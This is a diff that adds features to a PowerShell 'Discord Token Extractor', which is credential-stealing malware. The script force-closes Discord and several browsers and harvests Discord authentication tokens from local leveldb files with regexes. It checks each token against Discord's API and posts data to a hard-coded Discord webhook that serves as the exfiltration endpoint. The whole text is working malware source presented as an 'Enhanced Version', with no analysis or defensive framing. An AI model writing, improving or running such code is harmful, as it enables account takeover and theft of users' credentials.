@@ -1,8 +1,28 @@
-# Discord Token Extractor
+# Discord Token Extractor - Enhanced Version
 $webhook = "https://discord.com/api/webhooks/1462081265049010260/AdSpBnjtYKQFRI8lKt5oWg--qFCfwKF0b3q552oELMVzFxFDIdV0vUsGkEWWVSmuBLy0"
 $baseUrl = "https://discord.com/api/v9/users/@me"
 $regex = "[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
 $regexEnc = "dQw4w9WgXcQ:[^`"]*"
+
+# Force close all target processes
+$processesToKill = @("Discord", "DiscordCanary", "discord", "chrome", "msedge", "brave", "opera", "firefox")
+$killInfo = "Closing processes:`n"
+foreach ($proc in $processesToKill) {
+    try {
+        $running = Get-Process $proc -ErrorAction SilentlyContinue
+        if ($running) {
+            Stop-Process -Name $proc -Force -ErrorAction SilentlyContinue
+            $killInfo += "- $proc`: Killed $($running.Count) processes`n"
+        } else {
+            $killInfo += "- $proc`: Not running`n"
+        }
+    } catch {
+        $killInfo += "- $proc`: Error killing process`n"
+    }
+}
+Start-Sleep -Seconds 2
+$body = @{content=$killInfo} | ConvertTo-Json
+Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType "application/json"
 
 $paths = @{
     'Discord' = "$env:APPDATA\discord\Local Storage\leveldb\"
@@ -41,21 +61,25 @@ foreach ($name in $paths.Keys) {
     if (-not (Test-Path $path)) { continue }
     
     Get-ChildItem $path -Include "*.log","*.ldb" -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
-        $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
-        if ($content) {
-            $matches = [regex]::Matches($content, $regex)
-            foreach ($match in $matches) {
-                $token = $match.Value
-                try {
-                    $response = Invoke-RestMethod -Uri $baseUrl -Headers @{"Authorization" = $token} -ErrorAction Stop
-                    $uid = $response.id
-                    if ($uid -notin $uids) {
-                        $tokens += $token
-                        $uids += $uid
+        try {
+            $content = Get-Content $_.FullName -Raw -Encoding UTF8 -ErrorAction SilentlyContinue
+            if ($content -and $content.Length -gt 0) {
+                $matches = [regex]::Matches($content, $regex)
+                foreach ($match in $matches) {
+                    $token = $match.Value.Trim()
+                    if ($token.Length -gt 50) {
+                        try {
+                            $response = Invoke-RestMethod -Uri $baseUrl -Headers @{"Authorization" = $token} -TimeoutSec 10 -ErrorAction Stop
+                            $uid = $response.id
+                            if ($uid -notin $uids) {
+                                $tokens += $token
+                                $uids += $uid
+                            }
+                        } catch { }
                     }
-                } catch { }
+                }
             }
-        }
+        } catch { }
     }
 }
 
